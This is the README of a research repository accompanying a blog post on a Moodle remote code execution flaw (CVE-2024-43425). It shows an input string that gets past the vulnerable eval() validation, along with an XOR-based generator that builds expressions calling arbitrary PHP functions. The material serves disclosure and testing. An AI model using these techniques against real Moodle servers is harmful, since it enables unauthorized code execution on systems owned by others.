# Scripts to Test Input Validation in Moodle Calculated Questions (CVE-2024-43425)

This repository contains the companion scripts to the blog post [Back to School - Exploiting a Remote Code Execution Vulnerability in Moodle](https://blog.redteam-pentesting.de/2024/moodle-rce/), which describes a remote code execution vulnerability in the Moodle learning platform.

## Test the Validation Logic
The scripts in the `validation` directory can be used to directly test input strings against the validation logic used by Moodle to prevent abuse of a call to PHP `eval()`.

All code snippets were directly adapted from [Moodle's source code](https://github.com/moodle/moodle), using the [4.4.1 release](https://github.com/moodle/moodle/tree/v4.4.1/question/type/calculated) for the vulnerable version and [4.4.2](https://github.com/moodle/moodle/tree/v4.4.2/question/type/calculated) for the fixed version.
The scripts include the relevant parts of the `question/type/calculated/questiontype.php` file.

The `validation.php` file uses the vulnerable validation logic:

```sh
$ php validation.php '(1)->{phpinfo()}'
phpinfo()
PHP Version => 8.3.10
[...]
```

This repository also includes the fixed version of the validation code in `validation-fixed.php`:

```sh
$ php validation-fixed.php '(1)->{phpinfo()}'
error illegalformulasyntax with value: {phpinfo()}
[...]
```

## Generate Function Names

The script `xor-generator.py` can be used to generate expressions based on variable functions, which allow calling arbitrary PHP functions with a single numeric parameter in vulnerable versions of Moodle:

```sh
$ ./xor-generator.py 'PRINTF'
((acos(2) . 0+acos(2)) ^ (2 . 6 . 0 . 0 . 0 . 0) ^ (1 . 0 . 0 . 0 . -8) ^ (0 . -4 . 1 . 8 . 0) ^ (-8 . 3 . 1 . 0 . 0))

$ php -r '((acos(2) . 0+acos(2)) ^ (2 . 6 . 0 . 0 . 0 . 0) ^ (1 . 0 . 0 . 0 . -8) ^ (0 . -4 . 1 . 8 . 0) ^ (-8 . 3 . 1 . 0 . 0))("Test");'
Test
```
